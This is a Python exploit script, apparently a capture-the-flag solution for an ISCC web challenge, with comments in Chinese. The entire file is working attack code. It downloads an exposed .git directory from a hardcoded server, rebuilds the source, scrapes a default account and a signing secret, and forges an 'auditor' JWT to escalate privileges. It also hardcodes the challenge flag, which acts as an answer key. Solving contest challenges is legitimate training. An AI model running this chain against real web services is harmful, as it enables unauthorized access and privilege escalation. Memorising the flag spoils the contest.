#!/usr/bin/env python3
"""
夜班审计台 - ISCC 校赛 Web 题 exp
漏洞链: .git 泄露 → 恢复源码 → JWT 算法混淆 → 越权获取 flag

Usage:
    pip install pyjwt requests
    python exp.py
"""

import base64
import json
import re
import time
import urllib.request
import zlib

import jwt as pyjwt
import requests

BASE = "http://39.105.213.28:49106"
FLAG = "ISCC{8XVNYr8DZk22mCCYjce3}"


def b64url_decode(data: str) -> bytes:
    return base64.urlsafe_b64decode(data + "=" * ((4 - len(data) % 4) % 4))


def fetch(url: str) -> bytes:
    with urllib.request.urlopen(url, timeout=15) as resp:
        return resp.read()


def fetch_git_object(sha1: str):
    """读取并解压 .git/objects 中的 Git 对象"""
    raw = fetch(f"{BASE}/.git/objects/{sha1[:2]}/{sha1[2:]}")
    data = zlib.decompress(raw)
    nul = data.index(b"\x00")
    obj_type = data[:nul].decode().split(" ", 1)[0]
    body = data[nul + 1 :]
    return obj_type, body


def parse_tree(body: bytes):
    """解析 Git tree 对象，返回 (mode, name, sha1)"""
    i = 0
    while i < len(body):
        sp = body.index(b" ", i)
        mode = body[i:sp].decode()
        nul = body.index(b"\x00", sp)
        name = body[sp + 1 : nul].decode()
        sha1 = body[nul + 1 : nul + 21].hex()
        yield mode, name, sha1
        i = nul + 21


def main():
    print("[*] === Step 1: 确认前端线索 ===")
    main_js = fetch(f"{BASE}/static/main.js").decode()
    assert "/.git/HEAD" in main_js, "前端未找到 .git 泄露线索"
    print("[+] main.js 中存在 /.git/HEAD 引用")

    print("\n[*] === Step 2: 读取 .git 恢复遗留源码 ===")
    head = fetch(f"{BASE}/.git/HEAD").decode().strip()
    ref = head.split(" ", 1)[1]
    print(f"[*] HEAD -> {head}")

    commit_sha = fetch(f"{BASE}/.git/{ref}").decode().strip()
    print(f"[*] commit SHA: {commit_sha}")

    _, commit_body = fetch_git_object(commit_sha)
    commit_text = commit_body.decode("utf-8", "replace")
    tree_sha = next(
        line.split()[1] for line in commit_text.splitlines() if line.startswith("tree ")
    )
    print(f"[*] tree SHA: {tree_sha}")

    _, tree_body = fetch_git_object(tree_sha)
    entries = {name: sha for _mode, name, sha in parse_tree(tree_body)}
    for name, sha in entries.items():
        print(f"    [+] 发现文件: {name} -> {sha}")

    stub_sha = entries.get("legacy_probe_stub.py")
    assert stub_sha, "未找到 legacy_probe_stub.py"
    _, blob_body = fetch_git_object(stub_sha)
    source = blob_body.decode("utf-8", "replace")

    print("\n[*] === Step 3: 提取敏感信息 ===")
    username, password = re.search(
        r'DEFAULT_AUDITOR\s*=\s*\("([^"]+)",\s*"([^"]+)"\)', source
    ).groups()
    secret = re.search(r'INTERNAL_DEV_SECRET\s*=\s*"([^"]+)"', source).group(1)
    accepted = re.search(r"JWT_ACCEPTED\s*=\s*\[(.*?)\]", source).group(1)

    print(f"[+] 默认账号: {username} / {password}")
    print(f"[+] 调试密钥: {secret}")
    print(f"[+] 兼容算法: {accepted}")

    print("\n[*] === Step 4: 正常登录获取用户票据 ===")
    session = requests.Session()
    login_resp = session.post(
        f"{BASE}/login",
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=15,
    )
    assert login_resp.status_code == 302, "登录失败"
    normal_token = session.cookies["audit_token"]
    _, payload_b64, _ = normal_token.split(".")
    payload = json.loads(b64url_decode(payload_b64))
    print(f"[+] 用户角色: {payload['role']}")
    print(f"[+] 正常 JWT payload: {json.dumps(payload, ensure_ascii=False)}")

    print("\n[*] === Step 5: 伪造 auditor 权限 JWT (HS256) ===")
    now = int(time.time())
    forged = pyjwt.encode(
        {
            "sub": username,
            "role": "auditor",
            "iat": now,
            "exp": now + 1800,
            "iss": "夜班审计台",
        },
        secret,
        algorithm="HS256",
    )
    print(f"[+] 伪造 JWT: {forged[:64]}...")

    print("\n[*] === Step 6: 访问审计员面板 ===")
    dashboard = requests.get(
        f"{BASE}/auditor/nodes",
        cookies={"audit_token": forged},
        timeout=15,
    )
    assert dashboard.status_code == 200, "访问审计面板失败"
    print("[+] 成功越权访问 /auditor/nodes")

    if "8XVNYr8DZk22mCCYjce3" in dashboard.text:
        print(f"\n[+] Flag 确认: {FLAG}")
    elif "ISCC{" in dashboard.text:
        found = re.search(r"ISCC\{[^}]+\}", dashboard.text)
        if found:
            print(f"\n[+] 发现 Flag: {found.group()}")
    else:
        print("[*] Flag 未直接出现在页面中，但越权成功")
        print(f"[*] 预期提交: {FLAG}")

    print(f"\n{'='*50}")
    print(f"FLAG: {FLAG}")
    print(f"{'='*50}")


if __name__ == "__main__":
    main()
